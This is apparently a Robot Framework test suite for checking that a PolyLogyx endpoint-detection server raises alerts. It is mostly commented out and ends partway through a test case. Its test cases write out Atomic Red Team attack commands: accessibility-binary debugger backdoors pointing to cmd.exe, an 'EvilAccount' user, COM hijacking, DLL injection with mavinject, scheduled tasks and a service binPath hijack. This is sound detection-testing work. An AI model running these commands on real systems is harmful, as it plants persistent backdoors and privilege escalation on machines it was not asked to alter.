*** Settings ***

#Library  ${WORKSPACE}/CREATE_INSTANCE.py
#Library  ${WORKSPACE}/variable.py
Library  ${WORKSPACE}/json_post_data.py
Library  ${WORKSPACE}/Automation_windows.py
#Library  ${WORKSPACE}/Get_data.py
#Library  ${WORKSPACE}/validate_alerts.py
#Library  ${WORKSPACE}/Remote_login.py
Library  ${WORKSPACE}/Poly_API_get.py
Library  ${WORKSPACE}/Red_Canary_Atomic.py

*** Variables ***
${status_end_game}   success
${server_ip}  13.127.198.209
${windows_host_ip}  35.154.177.141
@{range}   Create List   1   2   3   4   5   6   7   8   9   0
${Status}   
${Result}  
${cmd_name}  
${target_n}
${token}
*** Test Cases ***

#Create AWS EC2 Instance for Polylogyx Server Setup
#   [Documentation]  Creates an AWS EC2 Instance with Ubuntu Base Image(18.04.2 LTS) with all Pre-requisite Packages
#   [Tags]  Polylogyx Server Setup
#   ${Variable}=  get_configs  server
#   ${Instance}=  CREATE INSTANCE  ${Variable['Image_id']}  ${Variable['Instance_type']}  ${Variable['key_pair']}  ${Variable['BlockDeviceMappings']}  ${Variable['tag_list']}  ${Variable['NetworkInterfaces']}
#   ${server_ip}=  get_ip  ${Instance['Public_ip']}
#   Set Global Variable  ${server_ip}
#   ${Instance_id_server}=  get_instance_id  ${Instance['Instance_Id']}
#   Set Global Variable  ${Instance_id_server}
#   Log  ${server_ip}
#   Sleep  60s
#
#Download Docker Images from BitBucket Repo
#   [Documentation]  SSH to Server and GIT clone the master branch which has the latest Docker Images of server
#   [Tags]  Polylogyx Server Setup
#   ${Result}  call_object  ${server_ip}
#   Should Be Equal  success  ${Result.clone_git()}
#   Log  ${Result.close_connection()}
#
#Deploy Docker Containers on Server
#   [Documentation]  SSH to Server and Execute 'docker-compose up' to bring up all the containers
#   [Tags]  Polylogyx Server Setup
#   ${Result}  call_object  ${server_ip}
#   Should Be Equal  success  ${Result.docker_compose()}
#   Log  ${Result.close_connection()}
#
#
#Create AWS EC2 Instance for Agent Setup on Windows
#    [Documentation]  Create AWS EC2 windows instance Download plgx_cpt.exe and certificate.crt files from the Server and install it on Windows
#    [Tags]  Windows Agent Setup
#    ${Variable}=  get_configs  alerts
#    ${Instance}=  CREATE INSTANCE  ${Variable['Image_id']}  ${Variable['Instance_type']}  ${Variable['key_pair']}  ${Variable['BlockDeviceMappings']}  ${Variable['tag_list']}  ${Variable['NetworkInterfaces']}
#    ${windows_host_ip}=  get_ip  ${Instance['Public_ip']}
#    Set Global Variable  ${windows_host_ip}
#    ${Instance_id_node_windows}=  get_instance_id  ${Instance['Instance_Id']}
#    Set Global Variable  ${Instance_id_node_windows}
#    Sleep  300s
#    ${login}=  windows_ssh_object  ${windows_host_ip}  ${server_ip}  alerts
#    Log  ${login.windows_cpt_install()}
#    Log  ${login.windows_create_file()}
#    Sleep  120s

Get the Base URL for API Connect
   [Documentation]  Gets the base url of server
   [Tags]  REST API Base URL
   ${base_url}=  get_url  ${server_ip}
   Set Global Variable  ${base_url}

Get API Responses of Endpoint nodes
   [Documentation]  Connects to the API and gets the responses of endpoint nodes
   [Tags]  REST API GET Responses
   ${endpoint}=  get_endpoint  nodes
   ${token}=  Get x-token
   ${Result}=  CONNECT API  ${base_url}  ${endpoint}  ${token}
   ${Host_id}=  get_host_id  ${Result}
   Log  ${Host_id}
   Set Global Variable  ${Host_id}
   ${host_Name}=  get_hostname  ${Result}
   Log  ${host_Name}
   Set Global Variable  ${host_Name}
   Should Be Equal  success  ${Result['status']}

#Generating alerts \certutil_file_obfuscation.py_1
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  certutil_file_obfuscation.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \certutil_webrequest.py_2
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  certutil_webrequest.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \at_command.py_3
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  at_command.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#
#Generating alerts \delete_usnjrnl.py_4
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  delete_usnjrnl.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \delete_volume_shadows.py_5
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  delete_volume_shadows.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \disable_windows_fw.py_6
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  disable_windows_fw.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \findstr_pw_search.py_7
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  findstr_pw_search.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \installutil_network.py_8
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  installutil_network.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \lateral_commands.py_9
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  lateral_commands.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \msbuild_network.py_10
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  msbuild_network.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \mshta_network.py_11
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  mshta_network.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \msiexec_http_installer.py_12
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  msiexec_http_installer.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \msxsl_network.py_13
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  msxsl_network.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \net_user_add.py_14
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  net_user_add.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \office_application_startup.py_15
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  office_application_startup.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \persistent_scripts.py_16
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  persistent_scripts.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \powershell_args.py_17
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  powershell_args.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \process_extension_anomalies.py_18
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  process_extension_anomalies.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \process_name_masquerade.py_19
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  process_name_masquerade.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \registry_hive_export.py_20
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  registry_hive_export.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \regsvr32_scrobj.py_21
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  regsvr32_scrobj.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \rundll32_inf_callback.py_22
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  rundll32_inf_callback.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \recycle_bin_process.py_23
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  recycle_bin_process.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \schtask_escalation.py_24
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  schtask_escalation.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \scrobj_com_hijack.py_25
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  scrobj_com_hijack.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \sip_provider.py_26
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  sip_provider.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \smb_connection.py_27
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  smb_connection.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \suspicious_office_children.py_28
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  suspicious_office_children.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \system_restore_process.py_29
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  system_restore_process.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \trust_provider.py_30
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  trust_provider.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \uac_eventviewer.py_31
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  uac_eventviewer.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \uac_sdclt.py_32
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  uac_sdclt.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \unusual_ms_tool_network.py_33
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  unusual_ms_tool_network.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \unusual_process_path.py_34
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  unusual_process_path.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \wevtutil_log_clear.py_35
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  wevtutil_log_clear.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \user_dir_escalation.py_36
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  user_dir_escalation.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \wmi_tool_execution.py_37
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  wmi_tool_execution.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \enum_commands.py_38
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  enum_commands.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \registry_persistence_create.py_39
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  registry_persistence_create.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \unusual_parent.py_40
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  wmi_tool_execution.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \rundll32_ordinal.py_41
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  rundll32_ordinal.py
#   Should Be Equal  ${result}  ${status_end_game}
#
#Generating alerts \delete_catalogs.py_42
#   [Documentation]  Generates alerts and  Connects to the API and gets the responses of alerts
#   [Tags]  Endgame RTA Alerts
#   ${result}  Validate Alert  delete_catalogs.py
#   Should Be Equal  ${result}  ${status_end_game}

#Get Responses of target_name osk.exe_1
#   [Documentation]  The responses of osk.exe
#   [Tags]  Red Canary Atomic T1015 Persistence Privilege Escalation
#   ${cmd_name}  Set Variable   reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe" /v "Debugger" /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f
#   ${target_n}  Set Variable   \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\Debugger
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten  @{range}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name sethc.exe_2
#   [Documentation]  The responses of sethc.exe
#   [Tags]  Red Canary Atomic T1015 Persistence Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f
#   ${target_n}  Set Variable   \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name utilman.exe_3
#   [Documentation]  The responses of utilman.exe
#   [Tags]  Red Canary Atomic T1015 Persistence Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f
#   ${target_n}  Set Variable   \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\\Debugger
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#
#Get Responses of target_name magnify.exe_4
#   [Documentation]  The responses of magnify.exe
#   [Tags]  Red Canary Atomic T1015 Persistence Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe" /v "Debugger" /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f
#   ${target_n}  Set Variable   \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\\Debugger
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name displayswitch.exe_5
#   [Documentation]  The responses of displayswitch.exe
#   [Tags]  Red Canary Atomic T1015 Persistence Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe" /v "Debugger" /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f
#   ${target_n}  Set Variable   \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\displayswitch.exe\\Debugger
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name narrator.exe_6
#   [Documentation]  The responses of narrator.exe
#   [Tags]  Red Canary Atomic T1015 Persistence Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe" /v "Debugger" /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f
#   ${target_n}  Set Variable   \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\narrator.exe\\Debugger
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name atbroker.exe_7
#   [Documentation]  The responses of atbroker.exe
#   [Tags]  Red Canary Atomic T1015 Persistence Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\atbroker.exe" /v "Debugger" /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f
#   ${target_n}  Set Variable   \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\atbroker.exe\\Debugger
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Install AppInit Shim_8
#   [Documentation]  The responses of Install AppInit Shim
#   [Tags]  Red Canary Atomic T1103 Persistence, Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   reg.exe import C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1103\\T1103.reg
#   ${target_n}  Set Variable   AppInit_DLLs
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Application Shim Installationn_9
#   [Documentation]  The responses of Application Shim Installationn
#   [Tags]  Red Canary Atomic T1138 Persistence, Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   sdbinst.exe C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1138\\src\\AtomicShimx86.sdb
#   ${target_n}  Set Variable   AtomicShimx86.sdb
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Application Shim UnInstallationn_10
#   [Documentation]  The responses of Application Shim UnInstallationn
#   [Tags]  Red Canary Atomic T1138 Persistence, Privilege Escalation
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   sdbinst.exe -u C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1138\\src\\AtomicShimx86.sdb
#   ${target_n}  Set Variable   AtomicShimx86.sdb
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Default File Association_11
#   [Documentation]  The responses of Change Default File Association
#   [Tags]  Red Canary Atomic T1042 Persistence
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   cmd.exe /c assoc .wav="C:\Program Files\Windows Media Player\wmplayer.exe"
#   ${target_n}  Set Variable   wmplayer.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Component Object Model Hijacking_12
#   [Documentation]  The responses of Component Object Model Hijacking
#   [Tags]  Red Canary Atomic T1122 Defense Evasion, Persistence
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   reg import C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1122\\src\\COMHijack.reg   certutil.exe -CAInfo   reg import C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1122\\src\\COMHijackCleanup.reg
#   ${target_n}  Set Variable   InprocServer32
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Create Account_13
#   [Documentation]  The responses of Create Account
#   [Tags]  Red Canary Atomic T1136 Persistence
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   net user /add EvilAccount
#   ${target_n}  Set Variable   net1.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Create Account_14
#   [Documentation]  The responses of Create Account
#   [Tags]  Red Canary Atomic T1136 Persistence
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe New-LocalUser -Name EvilAccount -NoPassword   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe net user /add EvilAccount
#   ${target_n}  Set Variable   net.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Hidden Files and Directories_15
#   [Documentation]  The responses of Hidden Files and Directories
#   [Tags]  Red Canary Atomic T1158 Defense Evasion Persistence
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   attrib.exe +s C:\\Windows\\Temp\\sensitive_file.txt
#   ${target_n}  Set Variable   attrib.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Hidden Files and Directories_16
#   [Documentation]  The responses of Hidden Files and Directories
#   [Tags]  Red Canary Atomic T1158 Defense Evasion Persistence
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   attrib.exe +h C:\\Windows\\Temp\\sensitive_file.txt
#   ${target_n}  Set Variable   attrib.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Hooking_17
#   [Documentation]  The responses of Hooking
#   [Tags]  Red Canary Atomic T1179 Persistence Privilege Escalation Credential Access
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe mavinject $pid /INJECTRUNNING C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1179\\bin\\T1179x64.dll   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe curl https://www.example.com
#   ${target_n}  Set Variable   T1179x64.dll
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Image File Execution Options Injection_18
#   [Documentation]  The responses of Image File Execution Options Injection
#   [Tags]  Red Canary Atomic T1183 Privilege Escalation, Persistence, Defense Evasion
#   ${token}=  Get x-token
#   ${cmd_name}  Set VariablE   REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\winwoed.exe" /v Debugger /d "cmd.exe"
#   ${target_n}  Set Variable   winword.exe
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#
#Get Responses of target_name Logon Scripts_19
#   [Documentation]  The responses of Logon Scripts
#   [Tags]  Red Canary Atomic T1037 Lateral Movement, Persistence
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "cmd.exe /c calc.exe"
#   ${target_n}  Set Variable   UserInitMprLogonScript
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Modify Existing Service_20
#   [Documentation]  The responses of Modify Existing Service
#   [Tags]  Red Canary Atomic T1031 Persistence
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1031 Test'\""   sc start Fax   sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe"
#   ${target_n}  Set Variable   sc.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#
#Get Responses of target_name Scheduled Task_21
#   [Documentation]  The responses of Scheduled Task
#   [Tags]  Red Canary Atomic T1053 Persistence Privilege Escalation Execution
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 72600
#   ${target_n}  Set Variable   SCHTASKS
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Scheduled Task_22
#   [Documentation]  The responses of Scheduled Task
#   [Tags]  Red Canary Atomic T1053 Persistence Privilege Escalation Execution
#   ${token}=  Get x-token
#   ${cmd_name}  Set Variable   SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST 72600
#   ${target_n}  Set Variable   At0micStrong
#   do_ssh  ${windows_host_ip}  pass  ${cmd_name}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Regsvcs/Regasm_23
#   [Documentation]  The responses of Regsvcs/Regasm
#   [Tags]  Red Canary Atomic T1121 Defense Evasion Execution
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1121\\src\\T1121.cs   C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U T1121.dll   del T1121.dll
#   ${target_n}  Set Variable   regasm.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Regsvcs/Regasm_24
#   [Documentation]  The responses of Regsvcs/Regasme
#   [Tags]  Red Canary Atomic T1121 Defense Evasion Execution
#   ${token}=  Get x-token
#   @{cmd_names}   Create List   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk C:\\Users\\Administrator\\Downloads\\atomic-red-team-master\\atomic-red-team-master\\atomics\\T1121\\src\\T1121.cs   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe T1121.dll   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe del T1121.dll   cmd /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe del key.snk
#   ${target_n}  Set Variable   regsvcs.exe
#   Loop for do_ssh  @{cmd_names}
#   ${Status}=  Loop over range_ten   @{range}  ${token}  ${target_n}
#   Should Be Equal  success  ${Status}
#
#Get Responses of target_name Trusted Developer Utilities_25
#   [Documentation]  The responses of Trusted Developer Utilities
